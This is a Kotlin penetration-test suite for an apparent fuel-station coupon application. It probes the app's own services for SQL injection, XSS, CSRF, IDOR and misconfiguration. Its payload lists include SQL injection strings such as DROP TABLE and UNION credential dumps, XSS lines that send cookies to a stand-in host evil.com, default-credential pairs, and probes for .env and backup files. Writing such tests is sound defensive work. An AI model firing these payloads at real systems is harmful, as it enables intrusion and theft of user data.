package com.gasolinerajsm.security.penetration

import com.gasolinerajsm.security.base.BaseSecurityTest
import com.gasolinerajsm.security.model.*
import io.restassured.RestAssured.given
import io.restassured.http.ContentType
import org.junit.jupiter.api.DisplayName
import org.junit.jupiter.api.Tag
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.TestInstance
import org.springframework.test.context.TestPropertySource
import kotlin.test.assertTrue

/**
 * Penetration tests for common security vulnerabilities
 *
 * Tests for OWASP Top 10 vulnerabilities and common attack vectors
 */
@TestInstance(TestInstance.Lifecycle.PER_CLASS)
@TestPropertySource(properties = ["spring.profiles.active=security-test"])
@Tag("security")
@Tag("penetration")
@DisplayName("Penetration Security Tests")
class PenetrationTest : BaseSecurityTest() {

    @Test
    @DisplayName("SQL injection vulnerability test")
    fun `should be protected against SQL injection attacks`() {
        val authUrl = getServiceUrl("auth-service")
        val gatewayUrl = getServiceUrl("api-gateway")
        val token = generateValidJwtToken("test-user", "CUSTOMER", "+525555001001")

        println("Testing SQL injection vulnerability protection...")

        // Test SQL injection in authentication
        val authSqlPayloads = listOf(
            "' OR '1'='1' --",
            "'; DROP TABLE users; --",
            "' UNION SELECT username, password FROM admin_users --",
            "admin'/**/OR/**/1=1#",
            "' OR 1=1 LIMIT 1 --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --"
        )

        authSqlPayloads.forEach { payload ->
            val response = given()
                .contentType(ContentType.JSON)
                .body(mapOf("phone_number" to payload, "otp_code" to "123456"))
                .`when`()
                .post("$authUrl/api/auth/login")

            val isProtected = response.statusCode in listOf(400, 401, 422) &&
                             !response.body.asString().lowercase().contains("sql") &&
                             !response.body.asString().lowercase().contains("syntax")

            recordSecurityTestResult(
                SecurityTestResult(
                    testName = "SQL Injection in Auth: $payload",
                    testType = SecurityTestType.INPUT_VALIDATION,
                    passed = isProtected,
                    expectedResult = "400/401/422 without SQL error details",
                    actualResult = "Status: ${response.statusCode}",
                    severity = SecuritySeverity.CRITICAL,
                    details = "SQL injection attempts should be blocked in authentication"
                )
            )
        }

        // Test SQL injection in search/query parameters
        val searchSqlPayloads = listOf(
            "1' OR '1'='1",
            "'; SELECT * FROM coupons WHERE '1'='1",
            "1 UNION SELECT null,username,password FROM users",
            "1; INSERT INTO admin_users VALUES ('hacker','password')"
        )

        searchSqlPayloads.forEach { payload ->
            val response = given()
                .header("Authorization", "Bearer $token")
                .queryParam("search", payload)
                .`when`()
                .get("$gatewayUrl/api/coupons")

            val isProtected = !response.body.asString().lowercase().contains("sql") &&
                             !response.body.asString().lowercase().contains("syntax") &&
                             response.statusCode != 500

            recordSecurityTestResult(
                SecurityTestResult(
                    testName = "SQL Injection in Search: $payload",
                    testType = SecurityTestType.INPUT_VALIDATION,
                    passed = isProtected,
                    expectedResult = "No SQL errors or data leakage",
                    actualResult = "Status: ${response.statusCode}",
                    severity = SecuritySeverity.CRITICAL,
                    details = "SQL injection attempts should be blocked in search queries"
                )
            )
        }
    }

    @Test
    @DisplayName("Cross-Site Scripting (XSS) vulnerability test")
    fun `should be protected against XSS attacks`() {
        val authUrl = getServiceUrl("auth-service")
        val gatewayUrl = getServiceUrl("api-gateway")
        val token = generateValidJwtToken("test-user", "CUSTOMER", "+525555001001")

        println("Testing XSS vulnerability protection...")

        val xssPayloads = listOf(
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "'\"><script>alert('XSS')</script>",
            "<script>document.location='http://evil.com/'+document.cookie</script>",
            "<img src=\"x\" onerror=\"fetch('http://evil.com/steal?cookie='+document.cookie)\">"
        )

        // Test XSS in user registration
        xssPayloads.forEach { payload ->
            val response = given()
                .contentType(ContentType.JSON)
                .body(mapOf(
                    "phone_number" to "+525555001001",
                    "first_name" to payload,
                    "last_name" to "Test"
                ))
                .`when`()
                .post("$authUrl/api/auth/register")

            val responseBody = response.body.asString()
            val isProtected = !responseBody.contains("<script>") &&
                             !responseBody.contains("onerror=") &&
                             !responseBody.contains("onload=") &&
                             !responseBody.contains("javascript:")

            recordSecurityTestResult(
                SecurityTestResult(
                    testName = "XSS in Registration: ${payload.take(20)}...",
                    testType = SecurityTestType.INPUT_VALIDATION,
                    passed = isProtected,
                    expectedResult = "XSS payload should be sanitized or rejected",
                    actualResult = "Protected: $isProtected",
                    severity = SecuritySeverity.HIGH,
                    details = "XSS payloads should be sanitized in user input fields"
                )
            )
        }

        // Test XSS in API responses
        xssPayloads.forEach { payload ->
            val response = given()
                .header("Authorization", "Bearer $token")
                .contentType(ContentType.JSON)
                .body(mapOf("name" to payload, "description" to "Test campaign"))
                .`when`()
                .post("$gatewayUrl/api/campaigns")

            val responseBody = response.body.asString()
            val isProtected = !responseBody.contains("<script>") &&
                             !responseBody.contains("onerror=") &&
                             !responseBody.contains("onload=")

            recordSecurityTestResult(
                SecurityTestResult(
                    testName = "XSS in API Response: ${payload.take(20)}...",
                    testType = SecurityTestType.INPUT_VALIDATION,
                    passed = isProtected,
                    expectedResult = "XSS payload should not appear in API responses",
                    actualResult = "Protected: $isProtected",
                    severity = SecuritySeverity.HIGH,
                    details = "API responses should sanitize XSS payloads"
                )
            )
        }
    }

    @Test
    @DisplayName("Cross-Site Request Forgery (CSRF) protection test")
    fun `should be protected against CSRF attacks`() {
        val authUrl = getServiceUrl("auth-service")
        val gatewayUrl = getServiceUrl("api-gateway")
        val token = generateValidJwtToken("test-user", "CUSTOMER", "+525555001001")

        println("Testing CSRF protection...")

        // Test 1: State-changing operations should require proper headers
        val csrfResponse = given()
            .header("Authorization", "Bearer $token")
            .header("Origin", "http://evil-site.com")
            .header("Referer", "http://evil-site.com/attack.html")
            .contentType(ContentType.JSON)
            .body(mapOf("phone_number" to "+525555999999"))
            .`when`()
            .post("$authUrl/api/auth/register")

        val csrfProtected = csrfResponse.statusCode in listOf(403, 400) ||
                           csrfResponse.headers.hasHeaderWithName("X-CSRF-Token")

        recordSecurityTestResult(
            SecurityTestResult(
                testName = "CSRF Protection for State Changes",
                testType = SecurityTestType.CSRF_PROTECTION,
                passed = csrfProtected,
                expectedResult = "CSRF protection should block cross-origin requests",
                actualResult = "Status: ${csrfResponse.statusCode}",
                severity = SecuritySeverity.HIGH,
                details = "State-changing operations should be protected against CSRF"
            )
        )

        // Test 2: SameSite cookie attributes
        val cookieResponse = given()
            .contentType(ContentType.JSON)
            .body(mapOf("phone_number" to "+525555001001", "otp_code" to "123456"))
            .`when`()
            .post("$authUrl/api/auth/login")

        val setCookieHeaders = cookieResponse.headers.getValues("Set-Cookie") ?: emptyList()
        val hasSameSiteCookies = setCookieHeaders.any { it.contains("SameSite=") }

        recordSecurityTestResult(
            SecurityTestResult(
                testName = "SameSite Cookie Attributes",
                testType = SecurityTestType.CSRF_PROTECTION,
                passed = hasSameSiteCookies,
                expectedResult = "Cookies should have SameSite attributes",
                actualResult = "Has SameSite cookies: $hasSameSiteCookies",
                severity = SecuritySeverity.MEDIUM,
                details = "SameSite cookie attributes help prevent CSRF attacks"
            )
        )

        // Test 3: Double Submit Cookie pattern (if implemented)
        val doubleSubmitResponse = given()
            .header("Authorization", "Bearer $token")
            .header("X-CSRF-Token", "invalid-token")
            .contentType(ContentType.JSON)
            .body(mapOf("name" to "Test Campaign"))
            .`when`()
            .post("$gatewayUrl/api/campaigns")

        // This test depends on implementation - if CSRF tokens are used, invalid tokens should be rejected
        val doubleSubmitProtected = doubleSubmitResponse.statusCode != 200 ||
                                   !doubleSubmitResponse.headers.hasHeaderWithName("X-CSRF-Token")

        recordSecurityTestResult(
            SecurityTestResult(
                testName = "Double Submit Cookie CSRF Protection",
                testType = SecurityTestType.CSRF_PROTECTION,
                passed = doubleSubmitProtected,
                expectedResult = "Invalid CSRF tokens should be rejected",
                actualResult = "Status: ${doubleSubmitResponse.statusCode}",
                severity = SecuritySeverity.MEDIUM,
                details = "CSRF token validation should reject invalid tokens"
            )
        )
    }

    @Test
    @DisplayName("Insecure Direct Object Reference (IDOR) test")
    fun `should prevent unauthorized access to resources`() {
        val gatewayUrl = getServiceUrl("api-gateway")
        val customerToken = generateValidJwtToken("customer1", "CUSTOMER", "+525555001001")
        val otherCustomerToken = generateValidJwtToken("customer2", "CUSTOMER", "+525555001002")

        println("Testing Insecure Direct Object Reference protection...")

        // Test 1: User should not access other user's data
        val userIdorResponse = given()
            .header("Authorization", "Bearer $customerToken")
            .`when`()
            .get("$gatewayUrl/api/users/999999") // Different user ID

        recordSecurityTestResult(
            SecurityTestResult(
                testName = "User IDOR Protection",
                testType = SecurityTestType.AUTHORIZATION,
                passed = userIdorResponse.statusCode in listOf(403, 404),
                expectedResult = "403 Forbidden or 404 Not Found",
                actualResult = "Status: ${userIdorResponse.statusCode}",
                severity = SecuritySeverity.CRITICAL,
                details = "Users should not access other users' data directly"
            )
        )

        // Test 2: Coupon access control
        val couponIdorResponse = given()
            .header("Authorization", "Bearer $customerToken")
            .`when`()
            .get("$gatewayUrl/api/coupons/other-user-coupon-id")

        recordSecurityTestResult(
            SecurityTestResult(
                testName = "Coupon IDOR Protection",
                testType = SecurityTestType.AUTHORIZATION,
                passed = couponIdorResponse.statusCode in listOf(403, 404),
                expectedResult = "403 Forbidden or 404 Not Found",
                actualResult = "Status: ${couponIdorResponse.statusCode}",
                severity = SecuritySeverity.HIGH,
                details = "Users should not access coupons belonging to other users"
            )
        )

        // Test 3: Redemption history access control
        val redemptionIdorResponse = given()
            .header("Authorization", "Bearer $customerToken")
            .`when`()
            .get("$gatewayUrl/api/redemptions/user/999999")

        recordSecurityTestResult(
            SecurityTestResult(
                testName = "Redemption IDOR Protection",
                testType = SecurityTestType.AUTHORIZATION,
                passed = redemptionIdorResponse.statusCode in listOf(403, 404),
                expectedResult = "403 Forbidden or 404 Not Found",
                actualResult = "Status: ${redemptionIdorResponse.statusCode}",
                severity = SecuritySeverity.HIGH,
                details = "Users should not access other users' redemption history"
            )
        )

        // Test 4: Sequential ID enumeration
        val sequentialIds = listOf(1, 2, 3, 100, 1000, 9999)
        val accessibleIds = mutableListOf<Int>()

        sequentialIds.forEach { id ->
            val response = given()
                .header("Authorization", "Bearer $customerToken")
                .`when`()
                .get("$gatewayUrl/api/stations/$id")

            if (response.statusCode == 200) {
                accessibleIds.add(id)
            }
        }

        val hasSequentialAccess = accessibleIds.size > 1 &&
                                 accessibleIds.zipWithNext().any { (a, b) -> b - a == 1 }

        recordSecurityTestResult(
            SecurityTestResult(
                testName = "Sequential ID Enumeration",
                testType = SecurityTestType.AUTHORIZATION,
                passed = !hasSequentialAccess,
                expectedResult = "Sequential IDs should not be easily enumerable",
                actualResult = "Accessible sequential IDs: $hasSequentialAccess",
                severity = SecuritySeverity.MEDIUM,
                details = "Sequential ID access patterns may indicate IDOR vulnerability"
            )
        )
    }

    @Test
    @DisplayName("Security misconfiguration test")
    fun `should not expose security misconfigurations`() {
        val gatewayUrl = getServiceUrl("api-gateway")
        val authUrl = getServiceUrl("auth-service")

        println("Testing security misconfiguration exposure...")

        // Test 1: Debug endpoints should not be accessible
        val debugEndpoints = listOf(
            "/actuator/env",
            "/actuator/configprops",
            "/actuator/beans",
            "/actuator/mappings",
            "/debug",
            "/trace",
            "/dump"
        )

        debugEndpoints.forEach { endpoint ->
            val response = given()
                .`when`()
                .get("$gatewayUrl$endpoint")

            recordSecurityTestResult(
                SecurityTestResult(
                    testName = "Debug Endpoint Exposure: $endpoint",
                    testType = SecurityTestType.SECURITY_MISCONFIGURATION,
                    passed = response.statusCode in listOf(401, 403, 404),
                    expectedResult = "Debug endpoints should not be publicly accessible",
                    actualResult = "Status: ${response.statusCode}",
                    severity = SecuritySeverity.HIGH,
                    details = "Debug endpoints can expose sensitive system information"
                )
            )
        }

        // Test 2: Default credentials should not work
        val defaultCredentials = listOf(
            Pair("admin", "admin"),
            Pair("admin", "password"),
            Pair("root", "root"),
            Pair("test", "test"),
            Pair("guest", "guest")
        )

        defaultCredentials.forEach { (username, password) ->
            val response = given()
                .contentType(ContentType.JSON)
                .body(mapOf("username" to username, "password" to password))
                .`when`()
                .post("$authUrl/api/auth/admin/login")

            recordSecurityTestResult(
                SecurityTestResult(
                    testName = "Default Credentials: $username/$password",
                    testType = SecurityTestType.SECURITY_MISCONFIGURATION,
                    passed = response.statusCode != 200,
                    expectedResult = "Default credentials should not work",
                    actualResult = "Status: ${response.statusCode}",
                    severity = SecuritySeverity.CRITICAL,
                    details = "Default credentials should be changed or disabled"
                )
            )
        }

        // Test 3: Directory listing should be disabled
        val directoryPaths = listOf(
            "/static/",
            "/assets/",
            "/images/",
            "/css/",
            "/js/"
        )

        directoryPaths.forEach { path ->
            val response = given()
                .`when`()
                .get("$gatewayUrl$path")

            val hasDirectoryListing = response.body.asString().contains("Index of") ||
                                     response.body.asString().contains("Directory listing")

            recordSecurityTestResult(
                SecurityTestResult(
                    testName = "Directory Listing: $path",
                    testType = SecurityTestType.SECURITY_MISCONFIGURATION,
                    passed = !hasDirectoryListing,
                    expectedResult = "Directory listing should be disabled",
                    actualResult = "Has directory listing: $hasDirectoryListing",
                    severity = SecuritySeverity.MEDIUM,
                    details = "Directory listing can expose sensitive files"
                )
            )
        }

        // Test 4: Error pages should not reveal server information
        val errorResponse = given()
            .`when`()
            .get("$gatewayUrl/nonexistent-endpoint-12345")

        val errorBody = errorResponse.body.asString().lowercase()
        val revealsServerInfo = errorBody.contains("tomcat") ||
                               errorBody.contains("jetty") ||
                               errorBody.contains("spring boot") ||
                               errorBody.contains("apache")

        recordSecurityTestResult(
            SecurityTestResult(
                testName = "Server Information in Error Pages",
                testType = SecurityTestType.SECURITY_MISCONFIGURATION,
                passed = !revealsServerInfo,
                expectedResult = "Error pages should not reveal server information",
                actualResult = "Reveals server info: $revealsServerInfo",
                severity = SecuritySeverity.LOW,
                details = "Server information in error pages aids attackers"
            )
        )
    }

    @Test
    @DisplayName("Sensitive data exposure test")
    fun `should not expose sensitive data`() {
        val authUrl = getServiceUrl("auth-service")
        val gatewayUrl = getServiceUrl("api-gateway")
        val token = generateValidJwtToken("test-user", "CUSTOMER", "+525555001001")

        println("Testing sensitive data exposure...")

        // Test 1: API responses should not contain sensitive fields
        val profileResponse = given()
            .header("Authorization", "Bearer $token")
            .`when`()
            .get("$authUrl/api/auth/profile")

        val profileBody = profileResponse.body.asString().lowercase()
        val containsSensitiveFields = profileBody.contains("password") ||
                                     profileBody.contains("secret") ||
                                     profileBody.contains("private_key") ||
                                     profileBody.contains("api_key")

        recordSecurityTestResult(
            SecurityTestResult(
                testName = "Sensitive Fields in API Response",
                testType = SecurityTestType.SENSITIVE_DATA_EXPOSURE,
                passed = !containsSensitiveFields,
                expectedResult = "API responses should not contain sensitive fields",
                actualResult = "Contains sensitive fields: $containsSensitiveFields",
                severity = SecuritySeverity.HIGH,
                details = "Sensitive data should be filtered from API responses"
            )
        )

        // Test 2: Log files should not be accessible
        val logPaths = listOf(
            "/logs/application.log",
            "/log/app.log",
            "/var/log/app.log",
            "/tmp/app.log",
            "/application.log"
        )

        logPaths.forEach { path ->
            val response = given()
                .`when`()
                .get("$gatewayUrl$path")

            recordSecurityTestResult(
                SecurityTestResult(
                    testName = "Log File Access: $path",
                    testType = SecurityTestType.SENSITIVE_DATA_EXPOSURE,
                    passed = response.statusCode in listOf(403, 404),
                    expectedResult = "Log files should not be publicly accessible",
                    actualResult = "Status: ${response.statusCode}",
                    severity = SecuritySeverity.HIGH,
                    details = "Log files may contain sensitive information"
                )
            )
        }

        // Test 3: Configuration files should not be accessible
        val configPaths = listOf(
            "/application.properties",
            "/application.yml",
            "/config.properties",
            "/.env",
            "/database.properties"
        )

        configPaths.forEach { path ->
            val response = given()
                .`when`()
                .get("$gatewayUrl$path")

            recordSecurityTestResult(
                SecurityTestResult(
                    testName = "Config File Access: $path",
                    testType = SecurityTestType.SENSITIVE_DATA_EXPOSURE,
                    passed = response.statusCode in listOf(403, 404),
                    expectedResult = "Configuration files should not be publicly accessible",
                    actualResult = "Status: ${response.statusCode}",
                    severity = SecuritySeverity.CRITICAL,
                    details = "Configuration files often contain sensitive credentials"
                )
            )
        }

        // Test 4: Backup files should not be accessible
        val backupPaths = listOf(
            "/backup.sql",
            "/database.bak",
            "/app.tar.gz",
            "/backup.zip",
            "/dump.sql"
        )

        backupPaths.forEach { path ->
            val response = given()
                .`when`()
                .get("$gatewayUrl$path")

            recordSecurityTestResult(
                SecurityTestResult(
                    testName = "Backup File Access: $path",
                    testType = SecurityTestType.SENSITIVE_DATA_EXPOSURE,
                    passed = response.statusCode in listOf(403, 404),
                    expectedResult = "Backup files should not be publicly accessible",
                    actualResult = "Status: ${response.statusCode}",
                    severity = SecuritySeverity.HIGH,
                    details = "Backup files may contain complete database dumps"
                )
            )
        }
    }

    @Test
    @DisplayName("Broken access control test")
    fun `should enforce proper access controls`() {
        val gatewayUrl = getServiceUrl("api-gateway")
        val authUrl = getServiceUrl("auth-service")

        println("Testing broken access control...")

        // Test 1: Horizontal privilege escalation
        val customer1Token = generateValidJwtToken("customer1", "CUSTOMER", "+525555001001")
        val customer2Token = generateValidJwtToken("customer2", "CUSTOMER", "+525555001002")

        val horizontalResponse = given()
            .header("Authorization", "Bearer $customer1Token")
            .`when`()
            .get("$gatewayUrl/api/users/customer2/profile")

        recordSecurityTestResult(
            SecurityTestResult(
                testName = "Horizontal Privilege Escalation",
                testType = SecurityTestType.AUTHORIZATION,
                passed = horizontalResponse.statusCode in listOf(403, 404),
                expectedResult = "Users should not access other users' resources",
                actualResult = "Status: ${horizontalResponse.statusCode}",
                severity = SecuritySeverity.CRITICAL,
                details = "Horizontal privilege escalation allows unauthorized data access"
            )
        )

        // Test 2: Vertical privilege escalation
        val customerToken = generateValidJwtToken("customer", "CUSTOMER", "+525555001001")
        val verticalResponse = given()
            .header("Authorization", "Bearer $customerToken")
            .`when`()
            .get("$authUrl/api/auth/admin/users")

        recordSecurityTestResult(
            SecurityTestResult(
                testName = "Vertical Privilege Escalation",
                testType = SecurityTestType.AUTHORIZATION,
                passed = verticalResponse.statusCode == 403,
                expectedResult = "403 Forbidden for admin endpoints",
                actualResult = "Status: ${verticalResponse.statusCode}",
                severity = SecuritySeverity.CRITICAL,
                details = "Customers should not access admin functionality"
            )
        )

        // Test 3: Method-based access control bypass
        val methodBypassTests = listOf("POST", "PUT", "DELETE", "PATCH")

        methodBypassTests.forEach { method ->
            val response = when (method) {
                "POST" -> given()
                    .header("Authorization", "Bearer $customerToken")
                    .contentType(ContentType.JSON)
                    .body(mapOf("test" to "data"))
                    .`when`()
                    .post("$authUrl/api/auth/admin/users")
                "PUT" -> given()
                    .header("Authorization", "Bearer $customerToken")
                    .contentType(ContentType.JSON)
                    .body(mapOf("test" to "data"))
                    .`when`()
                    .put("$authUrl/api/auth/admin/users/1")
                "DELETE" -> given()
                    .header("Authorization", "Bearer $customerToken")
                    .`when`()
                    .delete("$authUrl/api/auth/admin/users/1")
                "PATCH" -> given()
                    .header("Authorization", "Bearer $customerToken")
                    .contentType(ContentType.JSON)
                    .body(mapOf("test" to "data"))
                    .`when`()
                    .patch("$authUrl/api/auth/admin/users/1")
                else -> throw IllegalArgumentException("Unsupported method: $method")
            }

            recordSecurityTestResult(
                SecurityTestResult(
                    testName = "Method-based Access Control Bypass: $method",
                    testType = SecurityTestType.AUTHORIZATION,
                    passed = response.statusCode in listOf(403, 405),
                    expectedResult = "403 Forbidden or 405 Method Not Allowed",
                    actualResult = "Status: ${response.statusCode}",
                    severity = SecuritySeverity.HIGH,
                    details = "Access control should be enforced for all HTTP methods"
                )
            )
        }

        // Test 4: Parameter pollution access control bypass
        val paramPollutionResponse = given()
            .header("Authorization", "Bearer $customerToken")
            .queryParam("user_id", "customer1")
            .queryParam("user_id", "admin")
            .`when`()
            .get("$gatewayUrl/api/users/profile")

        recordSecurityTestResult(
            SecurityTestResult(
                testName = "Parameter Pollution Access Control Bypass",
                testType = SecurityTestType.AUTHORIZATION,
                passed = paramPollutionResponse.statusCode in listOf(400, 403),
                expectedResult = "Parameter pollution should be handled securely",
                actualResult = "Status: ${paramPollutionResponse.statusCode}",
                severity = SecuritySeverity.MEDIUM,
                details = "Parameter pollution can bypass access controls"
            )
        )
    }
}